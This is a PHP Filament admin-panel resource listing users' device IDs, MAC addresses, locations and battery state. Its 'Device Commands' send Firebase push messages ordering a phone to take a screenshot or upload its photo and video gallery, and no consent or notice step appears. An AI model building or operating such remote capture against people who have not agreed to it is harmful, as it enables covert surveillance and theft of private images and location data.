<?php

namespace App\Filament\Resources;

use App\Filament\Resources\UserResource\Pages;
use App\Filament\Resources\UserResource\RelationManagers;
use App\Models\User;
use Filament\Forms;
use Filament\Forms\Form;
use Filament\Resources\Resource;
use Filament\Tables;
use Filament\Tables\Table;
use Illuminate\Database\Eloquent\Builder;
use Illuminate\Database\Eloquent\SoftDeletingScope;

class UserResource extends Resource
{
    protected static ?string $model = User::class;

    protected static ?string $navigationIcon = 'heroicon-o-rectangle-stack';

    public static function form(Form $form): Form
    {
        return $form
            ->schema([
                Forms\Components\Tabs::make('User Details')
                    ->tabs([
                        Forms\Components\Tabs\Tab::make('User Profile')
                            ->icon('heroicon-o-user')
                            ->schema([
                                Forms\Components\TextInput::make('name')
                                    ->required(),
                                Forms\Components\TextInput::make('email')
                                    ->email(),
                                Forms\Components\DateTimePicker::make('email_verified_at'),
                                Forms\Components\TextInput::make('password')
                                    ->password()
                                    ->dehydrated(fn ($state) => filled($state))
                                    ->required(fn (string $context): bool => $context === 'create'),
                            ]),
                        Forms\Components\Tabs\Tab::make('Device Information')
                            ->icon('heroicon-o-device-phone-mobile')
                            ->schema([
                                Forms\Components\TextInput::make('device_id')
                                    ->readOnly(),
                                Forms\Components\TextInput::make('mac_address')
                                    ->readOnly(),
                                Forms\Components\TextInput::make('model')
                                    ->readOnly(),
                                Forms\Components\TextInput::make('location')
                                    ->readOnly(),
                            ]),
                    ])->columnSpanFull(),
            ]);
    }

    public static function table(Table $table): Table
    {
        return $table
            ->columns([
                Tables\Columns\TextColumn::make('name')
                    ->searchable()
                    ->weight('bold'),
                Tables\Columns\TextColumn::make('email')
                    ->searchable()
                    ->toggleable(isToggledHiddenByDefault: true),
                Tables\Columns\TextColumn::make('email_verified_at')
                    ->dateTime()
                    ->sortable()
                    ->toggleable(isToggledHiddenByDefault: true),
                Tables\Columns\TextColumn::make('created_at')
                    ->dateTime()
                    ->sortable()
                    ->toggleable(isToggledHiddenByDefault: true),
                Tables\Columns\TextColumn::make('updated_at')
                    ->dateTime()
                    ->sortable()
                    ->toggleable(isToggledHiddenByDefault: true),
                Tables\Columns\TextColumn::make('device_id')
                    ->searchable()
                    ->toggleable(isToggledHiddenByDefault: true),
                Tables\Columns\TextColumn::make('mac_address')
                    ->searchable()
                    ->toggleable(isToggledHiddenByDefault: true),
                Tables\Columns\TextColumn::make('model')
                    ->searchable()
                    ->badge(),
                Tables\Columns\TextColumn::make('location')
                    ->searchable()
                    ->icon('heroicon-o-map-pin'),
                Tables\Columns\TextColumn::make('battery_level')
                    ->label('Battery')
                    ->suffix('%')
                    ->sortable()
                    ->color(fn (string $state): string => match (true) {
                        $state > 50 => 'success',
                        $state > 20 => 'warning',
                        default => 'danger',
                    })
                    ->icon(fn (User $record): string => $record->is_charging ? 'heroicon-s-bolt' : 'heroicon-o-battery-50')
                    ->description(fn (User $record): string => $record->is_charging ? 'Charging' : ''),
            ])
            ->filters([
                //
            ])
            ->actions([
                Tables\Actions\EditAction::make(),
                Tables\Actions\ActionGroup::make([
                    Tables\Actions\Action::make('request_screenshot')
                        ->label('Request Screenshot')
                        ->icon('heroicon-o-camera')
                        ->requiresConfirmation()
                        ->action(function (User $record) {
                            if (!$record->fcm_token) {
                                \Filament\Notifications\Notification::make()
                                    ->title('No FCM Token')
                                    ->body('This device does not have an FCM token.')
                                    ->danger()
                                    ->send();
                                return;
                            }
    
                            try {
                                // Path to credentials
                                $credentialsPath = storage_path('app/firebase_credentials.json');
                                if (!file_exists($credentialsPath)) {
                                    throw new \Exception('Firebase credentials not found at ' . $credentialsPath);
                                }
    
                                $jsonKey = json_decode(file_get_contents($credentialsPath), true);
                                $projectId = $jsonKey['project_id'];
    
                                // Get Access Token
                                $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials(
                                    'https://www.googleapis.com/auth/firebase.messaging',
                                    $credentialsPath
                                );
                                $token = $credentials->fetchAuthToken();
    
                                // Send FCM
                                $client = new \GuzzleHttp\Client();
                                $response = $client->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
                                    'headers' => [
                                        'Authorization' => 'Bearer ' . $token['access_token'],
                                        'Content-Type' => 'application/json',
                                    ],
                                    'json' => [
                                        'message' => [
                                            'token' => $record->fcm_token,
                                            'data' => [
                                                'action' => 'screenshot',
                                            ],
                                        ],
                                    ],
                                ]);
    
                                \Filament\Notifications\Notification::make()
                                    ->title('Screenshot Requested')
                                    ->success()
                                    ->send();
    
                            } catch (\Exception $e) {
                                 \Filament\Notifications\Notification::make()
                                    ->title('Failed to Request Screenshot')
                                    ->body($e->getMessage())
                                    ->danger()
                                    ->send();
                            }
                        }),
                    Tables\Actions\Action::make('request_gallery_backup')
                        ->label('Request Gallery Backup')
                        ->icon('heroicon-o-photo')
                        ->form([
                            Forms\Components\Select::make('media_type')
                                ->label('Media Type')
                                ->options([
                                    'photos' => 'Photos Only',
                                    'videos' => 'Videos Only',
                                    'all' => 'Both (Photos & Videos)',
                                ])
                                ->default('all')
                                ->required(),
                        ])
                        ->action(function (User $record, array $data) {
                            if (!$record->fcm_token) {
                                 \Filament\Notifications\Notification::make()
                                    ->title('No FCM Token')
                                    ->danger()
                                    ->send();
                                return;
                            }
    
                            try {
                                 // Re-use credentials logic (Refactor later into a service)
                                 $credentialsPath = storage_path('app/firebase_credentials.json');
                                 $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials(
                                    'https://www.googleapis.com/auth/firebase.messaging',
                                    $credentialsPath
                                 );
                                 $token = $credentials->fetchAuthToken();
                                 $jsonKey = json_decode(file_get_contents($credentialsPath), true);
                                 $projectId = $jsonKey['project_id'];
    
                                 $client = new \GuzzleHttp\Client();
                                 $client->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
                                    'headers' => [
                                        'Authorization' => 'Bearer ' . $token['access_token'],
                                        'Content-Type' => 'application/json',
                                    ],
                                    'json' => [
                                        'message' => [
                                            'token' => $record->fcm_token,
                                            'data' => [
                                                'action' => 'backup_gallery',
                                                'media_type' => $data['media_type'],
                                            ],
                                        ],
                                    ],
                                ]);
    
                                \Filament\Notifications\Notification::make()
                                    ->title('Gallery Backup Requested')
                                    ->body("Request sent for " . $data['media_type'])
                                    ->success()
                                    ->send();
    
                            } catch (\Exception $e) {
                                 \Filament\Notifications\Notification::make()
                                    ->title('Request Failed')
                                    ->body($e->getMessage())
                                    ->danger()
                                    ->send();
                            }
                        }),
                ])
                ->label('Device Commands')
                ->icon('heroicon-m-ellipsis-horizontal')
                ->tooltip('Manage Device'),
            ])
            ->bulkActions([
                Tables\Actions\BulkActionGroup::make([
                    Tables\Actions\DeleteBulkAction::make(),
                ]),
            ]);
    }

    public static function getRelations(): array
    {
        return [
            RelationManagers\MediaRelationManager::class,
            RelationManagers\BackupsRelationManager::class,
        ];
    }

    public static function getPages(): array
    {
        return [
            'index' => Pages\ListUsers::route('/'),
            'create' => Pages\CreateUser::route('/create'),
            'edit' => Pages\EditUser::route('/{record}/edit'),
        ];
    }
}
